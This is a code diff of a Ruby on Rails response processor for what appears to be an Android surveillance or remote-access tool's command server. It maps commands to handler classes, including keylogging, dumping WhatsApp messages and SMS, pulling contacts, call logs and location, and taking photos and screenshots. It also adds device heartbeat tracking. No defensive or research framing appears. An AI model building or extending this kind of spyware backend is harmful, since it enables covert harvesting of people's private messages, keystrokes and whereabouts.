@@ -1,71 +1,93 @@
 # frozen_string_literal: true
 
-# Processes responses from Android devices via ResponseChannel
+# Processes responses from Android devices and dispatches to specific processor classes
+# based on the PendingCommand's command type
 class ResponseProcessor
+  # Command type to processor class mapping
+  COMMAND_PROCESSORS = {
+    'get_contacts' => ContactsResponseProcessor,
+    'get_call_logs' => CalllogsResponseProcessor,
+    'get_location' => LocationResponseProcessor,
+    'get_device_info' => DeviceinfoResponseProcessor,
+    'get_sms' => SmsResponseProcessor,
+    'take_screenshot' => ScreenshotResponseProcessor,
+    'take_photo' => PhotoResponseProcessor,
+    'get_installed_apps' => AppsResponseProcessor,
+    'dump_whatsapp_messages' => WhatsAppResponseProcessor,
+    'keylog' => KeylogResponseProcessor,
+    'list_installed_apps' => InstalledAppsResponseProcessor
+  }.freeze
+
   def self.process(data)
     return unless data.is_a?(Hash)
     
-    device_id = data['device_id']
-    response_type = data['type'] || data['response_type']
-    payload = data['payload'] || data['data']
+    payload = data['payload'] || data['data'] || data
     
-    Rails.logger.info \"[ResponseProcessor] Processing '#{response_type}' from device #{device_id}\"
-    
-    case response_type
-    when 'device_info'
-      process_device_info(device_id, payload)
-    when 'command_result'
-      process_command_result(device_id, payload)
-    when 'error'
-      process_error(device_id, payload)
-    else
-      Rails.logger.warn \"[ResponseProcessor] Unknown response type: #{response_type}\"
+    # Handle heartbeat without requiring PendingCommand
+    if payload['type'] == 'heartbeat' || payload['command'] == 'heartbeat'
+      process_heartbeat(payload)
+      return
     end
+    
+    request_id = payload['request_id'] || payload['command_id']
+    
+    return Rails.logger.warn("[ResponseProcessor] No request_id/command_id found in payload") unless request_id
+    
+    # Look up PendingCommand using request_id
+    pending_command = PendingCommand.find_by(request_id: request_id)
+    return Rails.logger.warn("[ResponseProcessor] PendingCommand not found for request_id: #{request_id}") unless pending_command
+    
+    Rails.logger.info "[ResponseProcessor] Processing command '#{pending_command.command}' for request_id: #{request_id}"
+    
+    # Get the appropriate processor class based on command type
+    processor_class = COMMAND_PROCESSORS[pending_command.command]
+    
+    unless processor_class
+      error_msg = "Unknown command type: #{pending_command.command}"
+      Rails.logger.error "[ResponseProcessor] #{error_msg}"
+      pending_command.mark_failed(error_msg)
+      return
+    end
+    
+    # Instantiate and process
+    processor = processor_class.new(pending_command, payload)
+    processor.process
+    
+    Rails.logger.info "[ResponseProcessor] Successfully processed '#{pending_command.command}' for request_id: #{request_id}"
   rescue StandardError => e
-    Rails.logger.error \"[ResponseProcessor] Error: #{e.message}\"
-    Rails.logger.error e.backtrace.join(\"\\n\")
+    Rails.logger.error "[ResponseProcessor] Error processing request_id #{request_id}: #{e.message}"
+    Rails.logger.error e.backtrace.join("\n")
+    
+    # Attempt to mark the pending command as failed if we have one
+    pending_command&.mark_failed(e.message) if pending_command
   end
-  
+
   private
-  
-  def self.process_device_info(device_id, payload)
-    return unless payload.is_a?(Hash)
+
+  def self.process_heartbeat(payload)
+    device_id = payload['device_id']
     
+    return Rails.logger.warn("[ResponseProcessor] No device_id in heartbeat payload") unless device_id.present?
+    
+    # Find the smartphone
     smartphone = Smartphone.find_by(device_id: device_id)
-    return unless smartphone
+    unless smartphone
+      Rails.logger.warn("[ResponseProcessor] Smartphone not found for device_id: #{device_id}")
+      return
+    end
     
-    smartphone.update(
-      name: payload['model'] || smartphone.name,
-      operating_system: \"Android #{payload['android_version']}\" || smartphone.operating_system,
-      is_rooted: payload['is_rooted'] || smartphone.is_rooted
-    )
-    
-    Rails.logger.info \"[ResponseProcessor] Updated device info for #{device_id}\"
-  end
-  
-  def self.process_command_result(device_id, payload)
-    return unless payload.is_a?(Hash)
-    
-    command_id = payload['command_id']
-    success = payload['success']
-    result = payload['result']
-    
-    # Store in cache or database as needed
-    Rails.cache.write(\"command_result:#{device_id}:#{command_id}\", {
-      success: success,
-      result: result,
+    # Update heartbeat in Redis
+    metadata = {
+      battery_level: payload['battery_level'],
+      connectivity: payload['connectivity'],
       timestamp: Time.current.to_i
-    }, expires_in: 1.hour)
+    }
     
-    Rails.logger.info \"[ResponseProcessor] Command #{command_id} result: #{success}\"
-  end
-  
-  def self.process_error(device_id, payload)
-    return unless payload.is_a?(Hash)
+    HeartbeatMonitor.process_heartbeat(device_id, metadata)
     
-    error_message = payload['error'] || payload['message']
-    Rails.logger.error \"[ResponseProcessor] Device #{device_id} error: #{error_message}\"
-    
-    # Could send alert, notification, etc.
+    Rails.logger.info "[ResponseProcessor] Processed heartbeat for device #{device_id} (#{smartphone.name})"
+  rescue StandardError => e
+    Rails.logger.error "[ResponseProcessor] Error processing heartbeat: #{e.message}"
+    Rails.logger.error e.backtrace.join("\n")
   end
 end
